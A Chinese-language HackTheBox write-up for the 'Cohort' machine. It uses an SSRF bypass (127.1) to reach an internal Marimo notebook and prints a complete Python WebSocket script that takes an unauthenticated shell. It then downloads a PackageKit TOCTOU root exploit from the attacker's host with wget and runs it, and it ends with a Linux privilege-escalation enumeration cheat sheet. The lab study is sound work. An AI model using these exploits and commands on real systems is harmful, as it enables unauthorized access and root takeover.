---
title: HackTheBox-Cohort
published: 2026-10-12T12:00:00
description: 本文记录 Cohort.htb 靶机渗透：利用 SSRF 读取 Nginx 状态页发现内部 Marimo，借 CVE-2026-39987 获取 shell，再通过 PackageKit TOCTOU 提权至 root。文末附通用 Linux 提权枚举清单，涵盖 SUID、计划任务、服务、D-Bus 等常用检查项与思路。
tags:
  - HackTheBox
  - 靶场
category: 网络安全
draft: false
---

```
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Not valid before: 2026-06-01T18:47:07
|_Not valid after:  2126-05-08T18:47:07
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

`*.cohort.htb`证明存在子域

配置hosts，打开页面是一个数据门户，核心功能在`portal.html`前端页面上操作“验证/获取数据源”

右侧提示`For security, internal and loopback addresses are rejected.`

目标url输入该网站本身验证，F12发现`POST https://cohort.htb/api/validate`

## Nginx

Nginx有一个内置模块 `ngx_http_stub_status_module`，它会在一个特定路径（比如 `/status` 或 `/nginx_status`）上，输出服务器的**基础运行状态**，比如活动连接数、请求处理总数等。

这个功能本身是为了方便管理员监控服务器，但如果配置不当（比如没有限制只允许本地访问），就会成为一个**信息泄露点**。攻击者可以通过这个路径，窥探到Nginx的内部配置信息。

url输入`http://127.1:80/status`进行绕过，返回内容如下：

```
{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":
[
	{"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},
	{"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},
	{"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}
]
}
```

- 一个内部 vhost 名：**`nb-1be3782a8afd3ad5.cohort.htb`**
    
- 它对应的后端端口：**8888**，而且明确标注为 internal，外部无法直接访问

url输入`http://127.1:8888`，得知服务为Marimo，Marimo提供了一个专门的 REST API 端点用于版本检查。即使登录页面被重定向，这个端点通常仍可访问。

Marimo的`/api/version`是公开REST端点，即使主页面要求登录，它通常也会返回版本JSON。通过SSRF让服务器自己访问 `127.0.0.1:8888/api/version`，就能拿到 `0.20.4`

url输入`http://127.1:8888/api/version`，返回版本号：`0.20.4`

## 漏洞核心：未授权的`/terminal/ws`

Marimo在启动时，通常以`EDIT`模式运行（这是其编辑器的默认模式）。这个模式下的`/terminal/ws`WebSocket端点缺少了关键的 `validate_auth()`认证函数调用，这意味着任何能访问到该端口的用户，都可以直接建立一个 WebSocket 连接，并获取一个完整的交互式 PTY Shell。

python脚本如下：

```python
import asyncio
import websockets
import re
import ssl

async def exploit(host, port):
    # 构建 WebSocket URL
    uri = f"wss://{host}:{port}/terminal/ws"
    print(f"[*] 正在连接到 {uri} ...")
    
    # 禁用 SSL 证书验证
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    try:
        # 连接时带上 'terminal' 子协议，这是 Marimo 要求的
        async with websockets.connect(uri, subprotocols=["terminal"], ssl=ssl_context) as ws:
            print("[+] 连接成功，已获得 Shell！输入命令 (输入 'exit' 退出)。")

            # 等待并接收初始的 Shell 提示符
            try:
                banner = await asyncio.wait_for(ws.recv(), timeout=2)
                # 清理终端控制字符，让输出更整洁
                clean_banner = re.sub(r'\x1b\[[0-9;?]*[a-zA-Z]', '', banner).strip()
                print(f"[PTY Banner]: {clean_banner}")
            except asyncio.TimeoutError:
                print("[*] 未收到初始提示符，继续...")

            # 进入交互循环
            while True:
                cmd = input("# ") # 在本地终端显示一个提示符
                if cmd.lower() in ['exit', 'quit']:
                    break
                if not cmd.strip():
                    continue

                # 发送命令，末尾加上 \n 模拟回车
                await ws.send(cmd + "\n")
                await asyncio.sleep(0.5) # 等待命令执行

                # 接收并打印输出
                output = []
                while True:
                    try:
                        # 设置一个短超时，如果没有更多输出就跳出循环
                        msg = await asyncio.wait_for(ws.recv(), timeout=1.5)
                        output.append(msg)
                    except asyncio.TimeoutError:
                        break

                # 清理并打印最终输出
                clean_output = re.sub(r'\x1b\[[0-9;?]*[a-zA-Z]', '', "".join(output)).strip()
                if clean_output:
                    print(clean_output)

    except Exception as e:
        print(f"[-] 连接失败: {e}")

if __name__ == "__main__":
    # 请将 TARGET_HOST 和 TARGET_PORT 替换为你的实际目标
    # 在你的场景中，由于有 Nginx 代理，你需要通过域名访问
    # 直接访问内部 vhost 会更容易，因为 Nginx 会根据 Host 头转发
    TARGET_HOST = "nb-1be3782a8afd3ad5.cohort.htb" 
    TARGET_PORT = 443 # 因为通过 HTTPS 入口，但 WebSocket 也是 wss
    # 如果直接连接内部端口，则可能是 8888 和 ws
    # TARGET_HOST = "127.0.0.1"
    # TARGET_PORT = 8888

    asyncio.run(exploit(TARGET_HOST, TARGET_PORT))
```

- **Marimo 真实监听**：`127.0.0.1:8888`（只在本机回环，外部无法直接访问）
    
- **Nginx 对外监听**：`80` (HTTP) 和 `443` (HTTPS)
    
- **Nginx 内部转发规则**：
    
    Host: nb-1be3782a8afd3ad5.cohort.htb  ->  127.0.0.1:8888
    

所以，想从外部连Marimo的WebSocket，必须走Nginx的入口。而WebSocket加密连接（`wss://`）默认端口就是 **443**，和 HTTPS 一样。

`python3 xxx.py`运行之后拿到shell

拿到一个低权限 Shell 后，不能直接上来就提权，要先回答几个问题：

1. **我是谁？** —— 当前用户、组、权限。
    
2. **我能做什么？** —— 有没有 sudo 权限、SUID、可写文件、计划任务等。
    
3. **系统上跑了什么？** —— 服务、进程、版本，有没有已知漏洞。
    
4. **目标漏洞能不能打？** —— 版本对不对、服务在不在、通信接口通不通。

在 Cohort 靶场里，预期提权路径是 **PackageKit 1.2.8 的 TOCTOU 漏洞 (CVE-2026-41651)**。所以这些命令的核心目的，就是**确认 PackageKit 是否存在、是否运行、版本是否匹配、D-Bus 接口是否可达**。

#### 1. `id`

- **作用**：显示当前用户 ID、组 ID、所属组。
    
- **为什么**：确认你现在是 `marimo`，不是 root，也没有在特权组里（比如 `sudo`、`docker`）。如果已经在特权组，提权方式就完全不同了。

#### 2. `sudo -l`

- **作用**：列出当前用户能以 sudo 身份执行哪些命令。
    
- **为什么**：这是最经典的提权检查。如果 `marimo` 能 sudo 运行某个命令，可能直接提权，不用打 PackageKit。即使不能，也要确认一下，排除简单路径。

#### 3. `dpkg -l | grep -i packagekit`

- **作用**：列出已安装的 PackageKit 相关包和版本。
    
- **为什么**：CVE-2026-41651 影响 **PackageKit 1.2.8**。你需要确认靶机上的版本是不是这个。如果不是，PackageKit 这条路可能走不通，得换方向。

#### 4. `systemctl status packagekit`

- **作用**：查看 PackageKit 服务的运行状态。
    
- **为什么**：漏洞利用需要 PackageKit 服务正在运行。如果服务没启动，D-Bus 接口不可用，漏洞就打不了。

#### 5. `ps aux | grep -i packagekit`

- **作用**：查看 PackageKit 相关进程。
    
- **为什么**：和 `systemctl` 类似，确认进程是否在跑。有时服务状态显示 active，但实际进程可能异常，多一层验证。

#### 6. `busctl list | grep -i packagekit`

- **作用**：列出系统 D-Bus 上的服务，过滤 PackageKit。
    
- **为什么**：CVE-2026-41651 的利用需要通过 **D-Bus** 调用 `org.freedesktop.PackageKit` 接口。如果 D-Bus 上看不到这个服务，说明 PackageKit 没有注册到系统总线，漏洞无法触发。

```
dpkg -l | grep -i packagekit
ii  gir1.2-packagekitglib-1.0             1.2.8-2ubuntu1.5                                 amd64        GObject introspection data for the PackageKit GLib library
ii  libpackagekit-glib2-18:amd64          1.2.8-2ubuntu1.5                                 amd64        Library for accessing PackageKit using GLib
hi  packagekit                            1.2.8-2ubuntu1.2                                 amd64        Provides a package management service
ii  packagekit-tools                      1.2.8-2ubuntu1.2                                 amd64        Provides PackageKit command-line tools
```

```
busctl list | grep -i packagekit
org.freedesktop.PackageKit       - -               -                (activatable) -                         -       -
```

CVE-2026-41651 是 PackageKit 在处理本地 `.deb` 安装请求时的 **TOCTOU（检查时间与使用时间）竞争条件**。  
攻击者可以：

1. 创建一个合法的 `.deb` 文件（或符号链接）。
    
2. 通过 D-Bus 让 PackageKit 去安装它。
    
3. 在 PackageKit 检查完文件、真正打开安装之前，**把文件替换成恶意的 `.deb`**。
    
4. 恶意 `.deb` 的 `postinst` 脚本会以 **root** 权限执行，从而提权。

这里直接使用poc了

攻击机起一个服务供靶机下载

```
git clone https://github.com/gbuyssens/CVE-2026-41651.git
python3 -m http.server 8000
```

靶机：

```
wget http://10.10.17.118:8000/exploit.py -O /tmp/exploit.py
```

Marimo版本0.20.4，通常与Python 3.x兼容，所以直接在靶机运行

```
python3 exploit.py
```

---

### 通用 Linux 枚举清单

下面这些命令，换到大多数Linux靶机或实战授权环境里都能用：

#### 1. 身份与权限

```bash
id
whoami
groups
sudo -l
cat /etc/passwd
cat /etc/group
```

- `sudo -l`  
    列出当前用户能以 sudo 身份执行哪些命令。  
    如果出现 `NOPASSWD`，或者能 sudo 运行 `vim`、`find`、`python`、`tar` 等，通常可以直接提权。
    
- `cat /etc/passwd`  
    看系统用户、UID、家目录、登录 shell。  
    重点找 UID 0 的非 root 用户、可疑账户、有 shell 的服务账户。
    
- `cat /etc/group`  
    看用户组关系。  
    重点看当前用户是否在 `sudo`、`adm`、`docker`、`lxd`、`disk` 等特权组。

#### 2. 系统信息

```bash
uname -a
cat /etc/os-release
hostnamectl
arch
```

- `uname -a`  
    作用：显示内核、主机名、内核版本、架构等系统信息。  
    原理：`uname` 读取内核信息，`-a` 表示显示全部可用信息。  
    参数：`-a` = all，输出所有字段。  
    提权线索：看内核版本，例如 `6.8.0-31-generic`，可用 `searchsploit kernel 6.8.0` 查对应内核提权漏洞。
    
- `cat /etc/os-release`  
    作用：查看发行版名称和版本。  
    原理：`/etc/os-release` 是系统发行版标识文件，记录 `PRETTY_NAME`、`VERSION_ID` 等。  
    参数：无，直接读取文件。  
    提权线索：确认是 Ubuntu、Debian、CentOS 等，决定用 `dpkg`、`rpm` 还是 `pacman`，并找发行版相关漏洞。
    
- `hostnamectl`  
    作用：显示主机名、系统概要、虚拟化类型。  
    原理：systemd 系统上的命令，从 systemd 和 DMI 信息中汇总。  
    参数：无，直接运行；可加 `status`，但默认就是显示状态。  
    提权线索：看 `Virtualization` 字段，比如 `kvm` 是虚拟机，`docker`、`lxc` 可能是容器，提权方向完全不同。
    
- `arch`  
    作用：只显示硬件架构。  
    原理：输出当前机器 CPU 架构，如 `x86_64`、`aarch64`。  
    参数：无。  
    提权线索：决定下载或编译哪个架构的 Exp、payload 和工具，避免架构不匹配。

#### 3. SUID / SGID / Capabilities

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

- `find / -perm -4000 -type f 2>/dev/null`  
    查找所有 SUID 文件。  
    SUID 程序运行时以**文件所有者权限**执行，如果所有者是 root，就可能被滥用提权。  
    `2>/dev/null` 是为了隐藏权限不足的报错。
    
- `find / -perm -2000 -type f 2>/dev/null`  
    查找所有 SGID 文件。  
    SGID 程序以**文件所属组权限**运行，某些情况下也能辅助提权或读取敏感文件。
    
- `getcap -r / 2>/dev/null`  
    递归列出文件的 Capabilities。  
    例如 `cap_setuid`、`cap_dac_read_search` 等能力，可以让普通程序拥有部分 root 权限，是常被忽略的提权点。
    
- `getcap -r / 2>/dev/null | grep -E "cap_setuid|cap_setgid|cap_dac"`  
    过滤高危 capability，快速定位可利用项。

#### 4. 计划任务

```bash
crontab -l
ls -la /etc/cron*
cat /etc/crontab
systemctl list-timers --all
```

- `crontab -l`  
    查看当前用户的 cron 任务。  
    如果某个脚本以 root 身份运行，但脚本本身或所在目录对当前用户可写，就能劫持执行命令。
    
- `ls -la /etc/cron*`  
    查看系统级 cron 目录和文件权限。  
    重点看 `/etc/cron.d`、`/etc/cron.hourly`、`/etc/cron.daily` 等是否有可写脚本。
    
- `cat /etc/crontab`  
    查看系统 crontab。  
    里面会标明任务以哪个用户运行，常见是 root。
    
- `systemctl list-timers --all`  
    查看 systemd 定时器。  
    有些任务不用 cron，而是用 systemd timer，同样可能被劫持。
    
- `pspy`  
    第三方工具，不需要 root 就能监控进程和计划任务。  
    适合观察短时间内以 root 运行的脚本、命令和参数。

#### 5. 服务与进程

```bash
ps aux
ps -ef
systemctl list-units --type=service --state=running
ss -tlnp
netstat -tlnp
```

- `ps aux` / `ps -ef`  
    查看所有进程。  
    重点找 root 运行的服务、自定义脚本、异常路径、开发环境进程。
    
- `systemctl list-units --type=service --state=running`  
    列出正在运行的服务。  
    结合版本和配置，找已知漏洞或可写服务文件。
    
- `ss -tlnp` / `netstat -tlnp`  
    查看监听端口和对应进程。  
    `-t` TCP，`-l` 监听，`-n` 数字显示，`-p` 显示进程。  
    内网服务、本地回环服务往往是下一步攻击面。
    
- `systemctl status <服务名>`  
    查看某个服务状态、启动命令、配置文件路径。  
    如果服务以 root 运行且配置可写，可能提权。

#### 6. 可写文件与目录

```bash
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null
ls -la /tmp /var/tmp /dev/shm
```

- `find / -writable -type f 2>/dev/null`  
    查找当前用户可写的文件。  
    重点看配置文件、脚本、服务文件、库文件。
    
- `find / -writable -type d 2>/dev/null`  
    查找当前用户可写的目录。  
    如果 root 任务会从这些目录加载脚本或模块，就能劫持。
    
- `ls -la /tmp /var/tmp /dev/shm`  
    查看临时目录权限和内容。  
    这些目录通常全局可写，常被用来放 payload 或竞争文件。
    
- `find / -perm -o+w -type f 2>/dev/null`  
    查找其他用户可写的文件。  
    比 `-writable` 更宽泛，能发现全局可写文件。

#### 7. 已安装软件与版本

```bash
dpkg -l          # Debian/Ubuntu
rpm -qa          # RHEL/CentOS
pacman -Q        # Arch
```

- `dpkg -l`  
    Debian/Ubuntu 系列出已安装软件包和版本。  
    用来对照 CVE，比如 PackageKit、sudo、polkit、内核模块等。
    
- `rpm -qa`  
    RHEL/CentOS/Fedora 系列出已安装 RPM 包。
    
- `pacman -Q`  
    Arch 系列出已安装包。
    
- `searchsploit <软件名> <版本>`  
    在本地 Exploit-DB 库搜索对应漏洞利用。  
    例如 `searchsploit packagekit 1.2.8`。

#### 8. 内核与漏洞

```bash
uname -r
cat /proc/version
searchsploit kernel <version>
```

- `uname -r`  
    查看内核版本。  
    老内核常有本地提权 CVE。
    
- `cat /proc/version`  
    查看内核版本和编译信息。  
    有时比 `uname -r` 更详细。
    
- `searchsploit kernel <版本>`  
    搜索内核提权 Exp。  
    例如 `searchsploit kernel 5.15.0`。

#### 9. 网络与 D-Bus

```bash
ip a
ip route
busctl list
dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames
```

- `ip a` / `ip route`  
    查看网络接口和路由。  
    发现内网网段、双网卡、容器网络、VPN 接口。
    
- `busctl list`  
    列出系统 D-Bus 上注册的服务。  
    D-Bus 是 Linux 服务间通信总线，很多提权漏洞都通过它触发。  
    例如 PackageKit 的 `org.freedesktop.PackageKit`。
    
- `dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames`  
    直接向 D-Bus 守护进程请求所有已注册名称。  
    当系统没有 `busctl` 时可用，用来找可调用的系统服务。
    
- `busctl introspect <服务名> <对象路径>`  
    查看某个 D-Bus 服务的方法、信号、属性。  
    用来确认某个接口是否可调用、需要什么参数。

#### 10. 环境变量与历史

```bash
env
echo $PATH
cat ~/.bash_history
cat /etc/profile
```

- `env`  
    查看环境变量。  
    重点看 `PATH`、`LD_PRELOAD`、`LD_LIBRARY_PATH`、代理变量、密钥变量。
    
- `echo $PATH`  
    查看命令搜索路径。  
    如果某个可写目录在 PATH 前面，且 root 脚本调用命令时没写绝对路径，就能 PATH 劫持。
    
- `cat ~/.bash_history`  
    查看当前用户历史命令。  
    可能泄露密码、路径、数据库连接、管理员操作习惯。
    
- `cat /etc/profile`  
    查看全局环境配置文件。  
    如果可写，可以注入命令，等管理员登录时执行。